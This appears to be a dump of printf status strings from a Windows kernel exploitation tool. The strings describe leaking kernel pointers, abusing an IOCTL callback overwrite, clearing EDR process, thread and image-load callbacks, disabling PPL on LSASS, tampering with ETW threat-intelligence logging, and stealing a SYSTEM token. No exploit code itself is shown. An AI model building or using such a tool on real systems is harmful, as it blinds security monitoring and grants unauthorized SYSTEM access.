			""\nChoose payload:\n"""
		""\nPPL Protection Signers:\n"""
"printf(
"printf(""[!] Disabling PPL on target process (Disabling PPL on LSASS in Windows 11 causes a reboot if not restored within a minute)\n"");"
"printf(""[!] ETW IsEnabled byte addr may be wrong, ETW_GUID_ENTRY->TRACE_ENABLE_INFO is %llx\n"", (isenabled & 0xFF));"
"printf(""[!] It is possible to set privilege fields to -1 to gain all privileges, but it will look anomalous\n"");"
"printf(""[!] Note the ACL offset is only confirmed valid for winlogon.exe, other processes may be different\n"");"
"printf(""[!] Note: A BSOD is likely if the target process closes while the token is in use\n"");"
"printf(""[*] Adding %llx offset, EtwThreatIntProvRegHandle is: %llx\n"", readKeApcQueueFunc, ntEtwThreatIntProvRegHandleAddr);"
"printf(""[*] Adding %x offset, PsSetLoadImageNotifyRoutineEx is: %llx\n"", readPspDllCallback, PsSetLoadImageNotifyRoutineEx);"
"printf(""[*] Adding %x offset, PspSetCreateProcessNotifyRoutine is: %llx\n"", readPspProcCallback, PspSetCreateProcessNotifyRoutine);"
"printf(""[*] Adding %x offset, PspSetCreateThreadNotifyRoutine is: %llx\n"", readPspThreadCallback, PspSetCreateThreadNotifyRoutine);"
"printf(""[*] All DLL image load callbacks cleared!\n"");"
"printf(""[*] All process callbacks cleared!\n"");"
"printf(""[*] All thread callbacks cleared!\n"");"
"printf(""[*] Base address of ntoskrnl.exe: 0x%llx\n"", ntosBase);"
"printf(""[*] Base address of ntoskrnl: 0x%llx\n"", (ULONGLONG)ntosbase);"
"printf(""[*] Calling IOCTL to exploit callback overwrite with nt!ExpProfileDelete\n"");"
"printf(""[*] Editing ACL to allow access to target PID: %d\n"", targetPid);"
"printf(""[*] Elevating to SYSTEM token\n"");"
"printf(""[*] Escalating privileges for target PID: %d\n"", targetPid);"
"printf(""[*] Exiting\n"");"
"printf(""[*] Kernel pointer to KeInsertQueueApc: %llx\n"", KeInsertQueueApcAddr);"
"printf(""[*] Kernel pointer to KeInsertQueueApc: 0x%llx\n"", KeInsertQueueApcAddr);"
"printf(""[*] Kernel pointer to PsInitialSystemProcess: 0x%llx\n"", systemProcessPtr);"
"printf(""[*] Kernel pointer to PsSetCreateProcessNotifyRoutine: %llx\n"", ProcCallbackAddr);"
"printf(""[*] Kernel pointer to PsSetCreateProcessNotifyRoutine: 0x%llx\n"", ProcCallbackAddr);"
"printf(""[*] Kernel pointer to PsSetCreateThreadNotifyRoutine: %llx\n"", ThreadCallbackAddr);"
"printf(""[*] Kernel pointer to PsSetCreateThreadNotifyRoutine: 0x%llx\n"", ThreadCallbackAddr);"
"printf(""[*] Kernel pointer to PsSetLoadImageNotifyRoutine: %llx\n"", DllCallbackAddr);"
"printf(""[*] Kernel pointer to PsSetLoadImageNotifyRoutine: 0x%llx\n"", DllCallbackAddr);"
"printf(""[*] Kernel pointer to SYSTEM process: %llx\n"", systemProcessAddr);"
"printf(""[*] Not running as NT AUTHORITY\\LOCAL SERVICE\n"");"
"printf(""[*] Opened file handle: 0x%x\n"", (DWORD)eaFile);"
"printf(""[*] Opened thread handle to self: 0x%x\n"", (DWORD)myhThread);"
"printf(""[*] Restored previous mode to user mode. Cleaning up and exiting\n"");"
"printf(""[*] Stealing target process token and starting cmd.exe\n"");"
"printf(""[*] Stealing token from target PID: %x\n"", targetPid);"
"printf(""[*] Targeting self\n"");"
"printf(""[+] Current process found at: %llx\n"", iterProc);"
"printf(""[+] ETW_REG_ENTRY located at %llx\n"", ntEtwThreatIntProvRegHandle);"
"printf(""[+] First DLL image load callback at: %llx\n"", callbackaddr);"
"printf(""[+] First process creation callback at: %llx\n"", callbackaddr);"
"printf(""[+] First thread creation callback at: %llx\n"", callbackaddr);"
"printf(""[+] Found kernel mode address of nt!ExpProfileDelete: 0x%llx\n"", kExpProfileDelete);"
"printf(""[+] Found likely jump offset at: %llx, value %llx\n"", (((ULONGLONG)DllCallbackAddr) + pspoffset), readPspDllCallback);"
"printf(""[+] Found likely jump offset at: %llx, value %llx\n"", (((ULONGLONG)KeInsertQueueApcAddr) + apcoffset), readKeApcQueueFunc);"
"printf(""[+] Found likely jump offset at: %llx, value %llx\n"", (((ULONGLONG)ProcCallbackAddr) + pspoffset), readPspProcCallback);"
"printf(""[+] Found likely jump offset at: %llx, value %llx\n"", (((ULONGLONG)ThreadCallbackAddr) + pspoffset), readPspThreadCallback);"
"printf(""[+] Found likely jump offset at: %llx, value %llx\n"", (PsSetLoadImageNotifyRoutineEx + pspoffset - 4), potentialPspCallback);"
"printf(""[+] Found likely jump offset at: %llx, value %llx\n"", (PspSetCreateProcessNotifyRoutine + pspoffset - 4), potentialPspCallback);"
"printf(""[+] Found likely jump offset at: %llx, value %llx\n"", (PspSetCreateThreadNotifyRoutine + pspoffset - 4), potentialPspCallback);"
"printf(""[+] Impersonated NT AUTHORITY\\LOCAL SERVICE\n"");"
"printf(""[+] Impersonated NT AUTHORITY\\SYSTEM\n"");"
"printf(""[+] Leaked KTHREAD for current process: 0x%llx\n"", (ULONGLONG)curKthread);"
